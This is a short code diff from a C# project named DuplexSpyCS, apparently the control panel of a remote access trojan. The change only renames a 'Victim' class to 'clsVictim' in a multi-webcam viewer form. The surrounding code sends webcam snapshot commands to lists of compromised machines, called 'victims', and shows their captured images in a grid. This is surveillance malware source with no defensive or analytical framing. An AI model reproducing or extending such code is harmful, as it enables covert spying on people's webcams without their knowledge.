@@ -13,7 +13,7 @@ namespace DuplexSpyCS
     public partial class frmMultiWebcam : Form
     {
         private int idx_page = 1;
-        public List<Victim> l_victim;
+        public List<clsVictim> l_victim;
 
         public frmMultiWebcam()
         {
@@ -37,7 +37,7 @@ namespace DuplexSpyCS
                 //int nRow = i / 3;
                 //int nCol = i % 3;
                 int nIdx = idx_start + i;
-                Victim v = l_victim[nIdx];
+                clsVictim v = l_victim[nIdx];
                 v.SendCommand("webcam|snapshot|0|monitor");
             }
         }
@@ -142,7 +142,7 @@ namespace DuplexSpyCS
                 //int nRow = i / 3;
                 //int nCol = i % 3;
                 int nIdx = idx_start + i;
-                Victim v = l_victim[nIdx];
+                clsVictim v = l_victim[nIdx];
                 PictureBox pb = (PictureBox)tableLayoutPanel1.Controls[i];
                 if (v.img_LastWebcam != null)
                     pb.Image = v.img_LastWebcam;
